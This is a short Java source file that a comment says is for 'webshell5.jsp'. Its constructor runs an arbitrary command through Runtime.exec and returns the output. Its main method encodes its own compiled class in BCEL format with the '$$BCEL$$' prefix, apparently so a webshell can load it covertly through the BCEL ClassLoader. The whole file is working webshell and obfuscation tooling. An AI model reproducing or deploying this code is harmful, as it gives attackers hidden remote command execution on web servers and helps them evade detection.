import com.sun.org.apache.bcel.internal.classfile.Utility;

import javax.servlet.ServletOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * 该类用于 webshell5.jsp
 */
public class Demo2 {
    String sret;
    public Demo2(String cmd) {
        InputStream in = null;
        try {
            in = Runtime.getRuntime().exec(cmd.split(" ")).getInputStream();
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String line = null;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            sret = sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String toString() {
        return sret;
    }

    public static void main(String[] args) {
        try {
            InputStream in = Demo2.class.getClassLoader().getResourceAsStream("Demo2.class");
            byte[] bytes = new byte[in.available()];
            in.read(bytes);
            String code = Utility.encode(bytes, true);
            System.out.println("$$BCEL$$" + code);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
